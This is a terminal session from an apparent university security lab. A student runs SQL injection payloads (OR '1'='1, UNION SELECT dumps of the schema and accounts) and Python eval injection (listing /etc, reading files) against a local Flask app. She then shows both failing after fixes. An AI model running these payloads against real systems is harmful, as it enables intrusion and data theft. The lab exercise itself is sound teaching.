```text
kinia@kawk2 pliki-dla-studentow % docker compose up -d
[+] up 1/1
 ! Image ochrona-danych-lab07:local pull access denied for ochrona-danyc... 1.3s
[+] Building 1.4s (12/12) FINISHED
 => [internal] load local bake definitions                                 0.0s
 => => reading from stdin 595B                                             0.0s
 => [internal] load build definition from Dockerfile                       0.0s
 => => transferring dockerfile: 394B                                       0.0s
 => [internal] load metadata for docker.io/library/python:3.12-alpine      1.1s
 => [internal] load .dockerignore                                          0.0s
 => => transferring context: 72B                                           0.0s
 => [1/5] FROM docker.io/library/python:3.12-alpine@sha256:c5ba3deef00c77  0.0s
 => => resolve docker.io/library/python:3.12-alpine@sha256:c5ba3deef00c77  0.0s
 => [internal] load build context                                          0.0s
 => => transferring context: 778B                                          0.0s
 => CACHED [2/5] RUN pip install --no-cache-dir flask==3.1.3 werkzeug==3.  0.0s
 => [3/5] COPY utworz_baze.py /tmp/utworz_baze.py                          0.0s
 => [4/5] RUN mkdir /dane && python /tmp/utworz_baze.py /dane/sekrety.db   0.1s
 => [5/5] WORKDIR /app                                                     0.0s
 => exporting to image                                                     0.1s
 => => exporting layers                                                    0.0s
 => => exporting manifest sha256:f16614084ae24ef7c349a2a26c7813d51ddfeed1  0.0s
 => => exporting config sha256:12a67f64937364694ccf07e0cebe97cb0a88b400e7  0.0s
 => => exporting attestation manifest sha256:a95587745b11440ad867723fff5e  0.0s
 => => exporting manifest list sha256:7369843f9fea123f09b2b98fe0084d37f40  0.0s
 => => naming to docker.io/library/ochrona-danych-lab07:local              0.0s
 => => unpacking to docker.io/library/ochrona-danych-lab07:local           0.0s
 => resolving provenance for metadata file                                 0.0s
WARN[0002] Found orphan containers (pliki-dla-studentow-zbieracz-1) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
[+] up 2/2
 ✔ Image ochrona-danych-lab07:local    Built                                2.9s
 ✔ Container pliki-dla-studentow-web-1 Started                              0.1s
kinia@kawk2 pliki-dla-studentow % docker compose ps
NAME                        IMAGE                        COMMAND           SERVICE   CREATED          STATUS          PORTS
pliki-dla-studentow-web-1   ochrona-danych-lab07:local   "python app.py"   web       15 seconds ago   Up 15 seconds   127.0.0.1:8080->8080/tcp
kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=1234" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="1234"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;1234&#39;</pre>

<p>Liczba wierszy: 1</p>
<ul><li>anna: Hello world</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz='" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39;"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;&#39;&#39;</pre>
<p class="blad">OperationalError: unrecognized token: &#34;&#39;&#39;&#39;&#34;</p>
<p>Liczba wierszy: 0</p>
<ul></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' OR '1'='1" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; OR &#39;1&#39;=&#39;1"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;&#39; OR &#39;1&#39;=&#39;1&#39;</pre>

<p>Liczba wierszy: 4</p>
<ul><li>anna: Hello world</li><li>piotr: Top secret</li><li>muszkieter: Jeden za wszystkich</li><li>admin: Szyfr do sejfu: 7319 (fikcyjny)</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; UNION SELECT name, sql FROM sqlite_master WHERE type=&#39;table&#39; --"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;&#39; UNION SELECT name, sql FROM sqlite_master WHERE type=&#39;table&#39; --&#39;</pre>

<p>Liczba wierszy: 2</p>
<ul><li>konta: CREATE TABLE konta(login TEXT, rola TEXT, email TEXT)</li><li>sekrety: CREATE TABLE sekrety(klucz TEXT, wlasciciel TEXT, sekret TEXT)</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' UNION SELECT login, rola FROM konta --" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; UNION SELECT login, rola FROM konta --"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;&#39; UNION SELECT login, rola FROM konta --&#39;</pre>

<p>Liczba wierszy: 2</p>
<ul><li>admin: administrator</li><li>anna: uzytkownik</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' UNION SELECT login, rola || ' / ' || email FROM konta --" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; UNION SELECT login, rola || &#39; / &#39; || email FROM konta --"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = &#39;&#39; UNION SELECT login, rola || &#39; / &#39; || email FROM konta --&#39;</pre>

<p>Liczba wierszy: 2</p>
<ul><li>admin: administrator / admin@lab7.example</li><li>anna: uzytkownik / anna@lab7.example</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % docker compose restart web
[+] restart 0/1
 ⠙ Container pliki-dla-studentow-web-1 Restarting                           3.2s
kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=1234" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="1234"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 1</p>
<ul><li>anna: Hello world</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz='" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39;"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 0</p>
<ul></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' OR '1'='1" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; OR &#39;1&#39;=&#39;1"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 0</p>
<ul></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; UNION SELECT name, sql FROM sqlite_master WHERE type=&#39;table&#39; --"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 0</p>
<ul></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=' UNION SELECT login, rola || ' / ' || email FROM konta --" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="&#39; UNION SELECT login, rola || &#39; / &#39; || email FROM konta --"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 0</p>
<ul></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "klucz=d'Artagnan" http://127.0.0.1:8080/sekret
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Sejf sekretów</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Sejf sekretów</h1>
<form><label>Klucz <input name="klucz" size="50" value="d&#39;Artagnan"></label> <button>Pokaż sekret</button></form>

<h2>Tryb diagnostyczny</h2>
<pre>SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?</pre>

<p>Liczba wierszy: 1</p>
<ul><li>muszkieter: Jeden za wszystkich</li></ul>


</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % docker compose logs --tail 30 web
web-1  | 172.18.0.1 - - [18/Nov/2026 11:35:57] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:36:56] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:36:58] "GET /sekret?klucz=' HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:38:15] "GET /sekret?klucz='+OR+'1'%3d'1 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:41:15] "GET /sekret?klucz='%20OR%20'1'='1 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:42:04] "GET /sekret?klucz='+UNION+SELECT+name,+sql+FROM+sqlite_master+WHERE+type%3d'table'+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:43:32] "GET /sekret?klucz='+UNION+SELECT+login,+rola+FROM+konta+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:43:59] "GET /sekret?klucz='+UNION+SELECT+login,+rola+||+'+/+'+||+email+FROM+konta+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:44:08] "GET /sekret?klucz='%20UNION%20SELECT%20login,%20rola%20FROM%20konta%20-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:44:43] "GET /sekret?klucz='%20UNION%20SELECT%20login,%20rola%20||%20'%20/%20'%20||%20email%20FROM%20konta%20-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:47:57] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:47:58] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 11:48:33] "GET /sekret?klucz=' HTTP/1.1" 200 -
web-1  |  * Serving Flask app 'app'
web-1  |  * Debug mode: off
web-1  | WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
web-1  |  * Running on all addresses (0.0.0.0)
web-1  |  * Running on http://127.0.0.1:8080
web-1  |  * Running on http://172.18.0.2:8080
web-1  | Press CTRL+C to quit
web-1  | 172.18.0.1 - - [18/Nov/2026 12:09:58] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:10:02] "GET /sekret?klucz=' HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:10:05] "GET /sekret?klucz='%20UNION%20SELECT%20login,%20rola%20||%20'%20/%20'%20||%20email%20FROM%20konta%20-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:10:39] "GET /sekret?klucz=1234 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:11:08] "GET /sekret?klucz=' HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:11:27] "GET /sekret?klucz='+OR+'1'%3d'1 HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:11:39] "GET /sekret?klucz='+UNION+SELECT+name,+sql+FROM+sqlite_master+WHERE+type%3d'table'+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:11:46] "GET /sekret?klucz='+UNION+SELECT+login,+rola+||+'+/+'+||+email+FROM+konta+-- HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:12:35] "GET /sekret?klucz=d'Artagnan HTTP/1.1" 200 -
web-1  | 172.18.0.1 - - [18/Nov/2026 12:12:51] "GET /sekret?klucz=d'Artagnan HTTP/1.1" 200 -
kinia@kawk2 pliki-dla-studentow % url -G --data-urlencode "wyrazenie=2*21" http://127.0.0.1:8080/kalkulator
zsh: command not found: url
kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "wyrazenie=2*21" http://127.0.0.1:8080/kalkulator
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Kalkulator</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Kalkulator</h1>
<form><label>Wyrażenie <input name="wyrazenie" size="50" value="2*21"></label> <button>Oblicz</button></form>
<p>Wynik: <output>42</output></p>

</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "wyrazenie=__import__('os').listdir('/etc')" http://127.0.0.1:8080/kalkulator
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Kalkulator</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Kalkulator</h1>
<form><label>Wyrażenie <input name="wyrazenie" size="50" value="__import__(&#39;os&#39;).listdir(&#39;/etc&#39;)"></label> <button>Oblicz</button></form>
<p>Wynik: <output>[&#39;modules-load.d&#39;, &#39;apk&#39;, &#39;periodic&#39;, &#39;nsswitch.conf&#39;, &#39;ssl1.1&#39;, &#39;hostname&#39;, &#39;crontabs&#39;, &#39;issue&#39;, &#39;profile.d&#39;, &#39;modprobe.d&#39;, &#39;logrotate.d&#39;, &#39;services&#39;, &#39;modules&#39;, &#39;sysctl.d&#39;, &#39;passwd&#39;, &#39;inittab&#39;, &#39;profile&#39;, &#39;udhcpc&#39;, &#39;os-release&#39;, &#39;secfixes.d&#39;, &#39;shells&#39;, &#39;busybox-paths.d&#39;, &#39;protocols&#39;, &#39;ssl&#39;, &#39;mtab&#39;, &#39;group&#39;, &#39;fstab&#39;, &#39;shadow&#39;, &#39;motd&#39;, &#39;opt&#39;, &#39;hosts&#39;, &#39;sysctl.conf&#39;, &#39;network&#39;, &#39;alpine-release&#39;, &#39;securetty&#39;, &#39;resolv.conf&#39;, &#39;group-&#39;, &#39;shadow-&#39;, &#39;passwd-&#39;, &#39;terminfo&#39;, &#39;netconfig&#39;, &#39;bindresvport.blacklist&#39;, &#39;inputrc&#39;, &#39;krb5.conf&#39;, &#39;ca-certificates.conf&#39;, &#39;ca-certificates&#39;]</output></p>

</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "wyrazenie=open('/etc/os-release').read()" http://127.0.0.1:8080/kalkulator
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Kalkulator</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Kalkulator</h1>
<form><label>Wyrażenie <input name="wyrazenie" size="50" value="open(&#39;/etc/os-release&#39;).read()"></label> <button>Oblicz</button></form>
<p>Wynik: <output>NAME=&#34;Alpine Linux&#34;
ID=alpine
VERSION_ID=3.24.4
PRETTY_NAME=&#34;Alpine Linux v3.24&#34;
HOME_URL=&#34;https://alpinelinux.org/&#34;
BUG_REPORT_URL=&#34;https://gitlab.alpinelinux.org/alpine/aports/-/issues&#34;
</output></p>

</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % curl -G --data-urlencode "wyrazenie=__import__('os').getuid()" http://127.0.0.1:8080/kalkulator
<!doctype html>
<html lang="pl">
<head><meta charset="utf-8"><title>Kalkulator</title>
<style>body { font-family: sans-serif; max-width: 52rem; margin: 2rem auto; padding: 0 1rem; }
pre { background: #f2f2f2; padding: .5rem; white-space: pre-wrap; } .blad { color: #a00; }</style></head>
<body>
<nav><a href="/">Start</a> | <a href="/sekret">Sejf sekretów</a> | <a href="/kalkulator">Kalkulator</a></nav>

<h1>Kalkulator</h1>
<form><label>Wyrażenie <input name="wyrazenie" size="50" value="__import__(&#39;os&#39;).getuid()"></label> <button>Oblicz</button></form>
<p>Wynik: <output>1000</output></p>

</body>
</html>%                                                                        kinia@kawk2 pliki-dla-studentow % docker compose restart web
[+] restart 0/1
 ⠙ Container pliki-dla-studentow-web-1 Restarting                           3.2s
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=2+3"    http://127.0.0.1:8080/kalkulator; echo
200
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=7 / 2"  http://127.0.0.1:8080/kalkulator; echo
200
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=-1.5*4" http://127.0.0.1:8080/kalkulator; echo
200
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=1/0"    http://127.0.0.1:8080/kalkulator; echo
400
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=__import__('os').listdir('/etc')" http://127.0.0.1:8080/kalkulator; echo
400
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=open('/etc/os-release').read()"   http://127.0.0.1:8080/kalkulator; echo
400
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=__import__('os').getuid()"        http://127.0.0.1:8080/kalkulator; echo
400
kinia@kawk2 pliki-dla-studentow % curl -s -o /dev/null -w "%{http_code} " -G --data-urlencode "wyrazenie=" http://127.0.0.1:8080/kalkulator; echo
400
```